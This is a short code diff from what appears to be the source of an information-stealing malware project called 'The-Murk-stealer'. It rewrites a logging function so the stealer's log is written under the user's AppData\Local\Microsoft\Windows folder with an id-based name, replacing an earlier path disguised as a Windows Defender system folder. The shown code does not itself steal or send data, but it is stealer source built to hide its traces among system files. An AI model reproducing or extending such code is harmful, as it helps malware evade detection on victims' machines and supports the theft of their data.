@@ -10,12 +10,13 @@
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
 
-from os import environ, sep
+from os import environ
+from preferences.config import config
 
 def Log(string):
     try:
-        pathf = environ['USERPROFILE'] + sep + r'AppData\Local'
-        f = open(rf'{pathf}\system\sysFiles\winDef\log20742384.txt', 'a', encoding='utf-8')
+        user = environ['USERPROFILE']
+        f = open(f'{user}\\AppData\\Local\\Microsoft\\Windows\\{str(config.id)}', 'a', encoding='utf-8')
         f.write(string+'\n')
         f.close()
     except:
